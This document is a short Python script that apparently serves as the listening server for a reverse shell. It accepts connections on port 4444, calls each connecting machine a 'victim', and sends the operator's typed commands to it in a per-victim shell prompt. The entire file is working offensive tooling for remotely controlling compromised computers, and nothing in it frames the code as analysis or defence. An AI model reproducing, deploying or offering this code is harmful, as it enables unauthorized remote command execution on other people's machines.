import socket
import threading

def handle_client(client_socket):
    while True:
        command = input(f"shell@{client_socket.getpeername()}> ")  # Custom prompt per victim
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        response = client_socket.recv(4096).decode()
        print(response)
    client_socket.close()

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(5)
print("[+] Server is listening...")

while True:
    client_socket, addr = server.accept()
    print(f"[+] New victim connected: {addr}")
    # Spin up a thread for each new client
    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
    client_thread.start()